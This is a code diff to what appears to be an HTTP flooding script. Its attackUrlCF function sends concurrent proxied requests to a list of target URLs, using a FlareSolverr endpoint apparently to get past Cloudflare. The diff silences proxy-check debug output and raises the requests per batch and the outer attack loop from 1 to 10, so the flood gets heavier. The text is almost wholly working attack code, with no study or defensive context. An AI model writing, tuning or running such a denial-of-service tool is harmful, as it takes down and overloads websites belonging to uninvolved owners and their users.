@@ -111,11 +111,11 @@ def attackUrlCF(baseUrl):
 			'Upgrade-Insecure-Requests': '1',
 			}
 
-			print(proxies, cookiesStr)
-			print(requests.get('https://api.ipify.org', proxies=proxies).content)
+			# print(proxies, cookiesStr)
+			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
 
 			requestsArr = []
-			for x in range(1):
+			for x in range(10):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
@@ -140,7 +140,7 @@ flareSolverUrl = 'http://localhost:8191/v1'
 
 # checkmyHeaders()
 
-for i in range(1):
+for i in range(10):
 	for url in attackList:
 		Thread(target=attackUrlCF, args=[url]).start()
 		time.sleep(10)
